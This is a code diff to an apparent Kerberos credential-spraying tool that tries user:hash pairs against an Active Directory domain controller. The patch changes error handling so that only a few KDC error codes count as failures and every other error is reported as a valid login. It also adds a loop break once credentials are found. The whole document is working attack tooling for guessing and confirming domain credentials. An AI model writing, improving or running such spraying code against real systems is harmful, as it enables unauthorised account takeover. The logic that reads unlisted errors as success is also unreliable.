@@ -33,10 +33,16 @@ class PschittKerberos:
             if self.verbose:
                 print(f"[+] Successful authentication for {self.user}:{self.hash}")
             return True
+            
         except KerberosError as e:
-            if self.verbose:
-                print(f"[-] Kerberos error: {e}")
-            return e
+            if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
+                if self.verbose:
+                    print(f"[-] Kerberos error: {e}")
+                return e
+            else:
+                if self.verbose:
+                    print(f"[+] Successful authentication for {self.user}:{self.hash}")
+                return True
         except socket.error as e:
             print('[-] Could not connect to DC')
             return
@@ -66,6 +72,7 @@ def main():
                 match kerberos_sprayer.spray():
                     case True:
                         print(f'[+] {args.username}:{hash} is valid creds')
+                        break
                     case _:
                         if args.verbose:
                             print(f'[-] {args.username}:{args.hash}', kerberos_sprayer.spray())
